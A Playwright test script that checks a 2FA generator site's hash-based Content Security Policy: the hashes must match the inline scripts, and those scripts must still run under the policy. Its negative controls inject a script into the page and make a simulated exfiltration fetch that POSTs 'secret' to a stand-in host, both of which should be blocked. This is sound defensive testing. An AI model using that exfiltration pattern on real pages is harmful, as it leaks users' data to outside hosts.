// Hash-based CSP verification (2facounter.com).
//
// The build replaces a placeholder in public/_headers with the SHA-256 of every
// executable inline <script>, and writes the same finished policy to
// csp.generated.mjs for the Worker fallback. This test proves both halves:
//
//   static — recompute the hashes from dist/**.html and require the emitted
//            header, the generated module and the HTML to agree. Catches a
//            stale csp.generated.mjs, which would ship a Worker fallback that
//            blocks the site's own scripts; also fails if 'unsafe-inline'
//            ever reappears in script-src.
//   live   — load pages with that exact policy attached and prove each of the
//            three inline scripts actually executed (mirror-host guard,
//            service-worker registration, mobile-menu handler) while the
//            browser reports no CSP violation.
//
// Needs `astro build` first and a preview server (E2E_BASE, default :4322).
import { readFileSync, readdirSync, existsSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { chromium } from 'playwright';

const BASE = process.env.E2E_BASE ?? 'http://localhost:4322/';
const DIST = new URL('./dist/', import.meta.url);

const results = [];
const check = (name, ok, detail = '') =>
  results.push(`${ok ? 'PASS' : 'FAIL'} ${name}${detail ? ' — ' + detail : ''}`);

// ── the same extraction the csp-hashes integration performs ────────────────
const DATA_TYPES = /^(application\/(ld\+)?json|text\/(plain|template))$/i;

const walk = (url) => {
  const out = [];
  for (const entry of readdirSync(url, { withFileTypes: true })) {
    const child = new URL(entry.name + (entry.isDirectory() ? '/' : ''), url);
    if (entry.isDirectory()) out.push(...walk(child));
    else if (entry.name.endsWith('.html')) out.push(child);
  }
  return out;
};

const hashesFromHtml = new Map(); // hash → occurrences
let pages = 0;
for (const page of walk(DIST)) {
  pages++;
  const html = readFileSync(page, 'utf8');
  for (const script of html.matchAll(/<script([^>]*)>([\s\S]*?)<\/script>/gi)) {
    if (/\bsrc\s*=/i.test(script[1])) continue;
    const type = script[1].match(/\btype\s*=\s*["']([^"']+)["']/i)?.[1].trim() ?? 'text/javascript';
    if (DATA_TYPES.test(type)) continue;
    const hash = createHash('sha256').update(script[2], 'utf8').digest('base64');
    hashesFromHtml.set(hash, (hashesFromHtml.get(hash) ?? 0) + 1);
  }
}

const headersText = readFileSync(new URL('_headers', DIST), 'utf8');
const CSP = /^\s*Content-Security-Policy:[ \t]*(.+)$/im.exec(headersText)?.[1].trim() ?? '';

check('dist/_headers carries a CSP', CSP.length > 0);
check('build replaced the hash placeholder', !CSP.includes('__CSP_SCRIPT_HASHES__'));
check('inline scripts were hashed', hashesFromHtml.size > 0, `${hashesFromHtml.size} unique over ${pages} pages`);
check(
  'script-src has no unsafe-inline',
  !/script-src[^;]*'unsafe-inline'/.test(CSP),
  /script-src([^;]*)/.exec(CSP)?.[1].trim() ?? '',
);

const headerHashes = new Set(
  [...CSP.matchAll(/'sha256-([^']+)'/g)].map((m) => m[1]),
);
const htmlHashes = new Set(hashesFromHtml.keys());
const missing = [...htmlHashes].filter((h) => !headerHashes.has(h));
const extra = [...headerHashes].filter((h) => !htmlHashes.has(h));
check(
  'header hash set matches the built HTML exactly',
  missing.length === 0 && extra.length === 0,
  missing.length || extra.length ? `missing=${missing.length} extra=${extra.length}` : '',
);

// The Worker fallback must be the same string the asset layer serves.
const generatedPath = new URL('./csp.generated.mjs', import.meta.url);
check('csp.generated.mjs exists (worker.mjs imports it)', existsSync(generatedPath));
let generatedCsp = '';
if (existsSync(generatedPath)) {
  const mod = await import(generatedPath.href);
  generatedCsp = mod.CONTENT_SECURITY_POLICY ?? '';
}
check('csp.generated.mjs equals the served policy', generatedCsp === CSP);

// ── live: attach that policy and prove the inline scripts still run ────────
const browser = await chromium.launch();
const violations = [];

const newCspContext = async (options = {}) => {
  const context = await browser.newContext({ permissions: [], ...options });
  await context.addInitScript(() => {
    window.__cspViolations = [];
    document.addEventListener('securitypolicyviolation', (event) => {
      window.__cspViolations.push(`${event.violatedDirective} blocked ${event.blockedURI || '(inline)'}`);
    });
  });
  // Only document responses need the header: subresources inherit the policy
  // of the document that loaded them, and a CSP on a .js response is ignored.
  await context.route('**/*', async (route) => {
    if (route.request().resourceType() !== 'document') return route.continue();
    const response = await route.fetch();
    await route.fulfill({
      response,
      headers: { ...response.headers(), 'content-security-policy': CSP },
    });
  });
  return context;
};

const collectViolations = async (page, label) => {
  const found = await page.evaluate(() => window.__cspViolations ?? []);
  for (const v of found) violations.push(`${label}: ${v}`);
  return found;
};

// 1. mirror-host guard: on a non-canonical host it must append a noindex meta.
//    If the hash were wrong, the script would be blocked and this stays empty.
{
  const context = await newCspContext();
  const page = await context.newPage();
  const response = await page.goto(BASE, { waitUntil: 'load' });
  check('policy is actually applied by the test', response?.headers()['content-security-policy'] === CSP);
  await page.waitForTimeout(400);
  const noindex = await page.evaluate(() =>
    [...document.querySelectorAll('meta[name="robots"]')].some((m) => /noindex/i.test(m.getAttribute('content') || '')),
  );
  check('inline script 1/3 ran (mirror-host noindex guard)', noindex);
  await collectViolations(page, 'home');
  await context.close();
}

// 2. generator module still loads under script-src 'self'.
{
  const context = await newCspContext();
  const page = await context.newPage();
  await page.goto(BASE, { waitUntil: 'load' });
  await page.fill('#secret-key-input', 'JBSWY3DPEHPK3PXP');
  await page.waitForTimeout(700);
  const digits = (await page.locator('#token-value').textContent()) ?? '';
  check('generator still produces a code under the CSP', /\d{6}/.test(digits.replace(/\D/g, '')), digits.trim());
  await collectViolations(page, 'generator');
  await context.close();
}

// 3. mobile-menu handler (the bundled inline module).
{
  const context = await newCspContext({ viewport: { width: 375, height: 667 } });
  const page = await context.newPage();
  await page.goto(BASE, { waitUntil: 'load' });
  await page.locator('#menu-toggle').click();
  await page.waitForTimeout(250);
  const open = await page.locator('#mobile-menu').isVisible();
  check('inline script 2/3 ran (mobile-menu handler)', open);
  await collectViolations(page, 'mobile-menu');
  await context.close();
}

// 4. service-worker registration inline script.
{
  const context = await newCspContext();
  const page = await context.newPage();
  await page.goto(BASE, { waitUntil: 'load' });
  let registered = false;
  try {
    await page.waitForFunction(
      () => navigator.serviceWorker?.getRegistrations().then((r) => r.length > 0),
      null,
      { timeout: 10000 },
    );
    registered = true;
  } catch {
    registered = false;
  }
  check('inline script 3/3 ran (service-worker registration)', registered);
  await collectViolations(page, 'service-worker');
  await context.close();
}

// 5. negative controls: the policy must block what the post claims it blocks.
//    Without these, a permissive policy would still pass every check above.
{
  const context = await newCspContext();
  const page = await context.newPage();
  await page.goto(BASE, { waitUntil: 'load' });

  await page.evaluate(() => {
    const script = document.createElement('script');
    script.textContent = 'window.__injectedRan = true;';
    document.body.appendChild(script);
  });
  const injectedRan = await page.evaluate(() => window.__injectedRan === true);
  check('negative: injected inline script is blocked', !injectedRan);

  const exfil = await page.evaluate(async () => {
    try {
      await fetch('https://example.com/collect', { method: 'POST', body: 'secret' });
      return 'allowed';
    } catch {
      return 'blocked';
    }
  });
  check('negative: outbound fetch to another origin is blocked', exfil === 'blocked', exfil);

  const reported = await page.evaluate(() => window.__cspViolations ?? []);
  check('negative: both attempts were reported as violations', reported.length >= 2, reported.join(' | '));
  await context.close();
}

check('browser reported no CSP violations', violations.length === 0, violations.slice(0, 4).join(' | '));

await browser.close();

console.log('\n=== CSP ===');
for (const line of results) console.log(line);
const failed = results.filter((r) => r.startsWith('FAIL'));
if (failed.length) {
  console.error(`\n✗ ${failed.length} CSP check(s) failed`);
  process.exit(1);
}
console.log('\n✓ CSP verified (hash-based script-src, all three inline scripts allowed)');
